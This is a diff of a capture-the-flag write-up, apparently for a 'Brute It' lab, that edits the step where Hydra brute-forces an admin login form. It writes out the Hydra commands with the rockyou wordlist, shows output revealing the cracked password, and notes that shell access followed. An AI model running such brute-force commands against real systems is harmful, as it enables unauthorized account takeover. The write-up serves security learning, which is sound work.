@@ -68,22 +68,24 @@ Step 6. **Checked more details about the page on browser devtools**
    ![Login leads](/assets/images/brute-it/User-login-info-devtools.png)
 
 
-Step 7. **Ran Hydra to brute-force credentials**  
-   Used a common username/password list to brute-force SSH.
+Step 7. **Ran Hydra to Brute-Force Credentials**  
+   Used Hydra with the rockyou.txt wordlist to brute-force the admin login:
+First Attempt (Slow Output)
 
-   I tried command "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^login=^Login:Username or password invalid"" but the output was slow.
+"hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^login=^Login:Username or password invalid"" The initial attempt was too slow due to default settings.
 
    ![Hydra Brute Force](/assets/images/brute-it/slow-output.png)
 
-   I opted to use command “hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 16 -vV 10.10.245.181 http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid" “
-   
-    ![Hydra Brute Force](/assets/images/brute-it/hydra.png)
+   Optimized Attempt (Faster)
+
+"hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 16 -vV 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid""
+
+ ![Hydra Command Execution](/assets/images/brute-it/hydra.png)
 
    Finally I got the password
 [80][http-post-form] host: 10.10.245.181   login: admin   password: xavier
 
-
-    ![Hydra Brute Force](/assets/images/brute-it/hydra1.png)
+ ![Hydra Command Execution](/assets/images/brute-it/hydra1.png)
 
 Step 8. **Gained shell access**  
    Logged in successfully and obtained user access to the system.
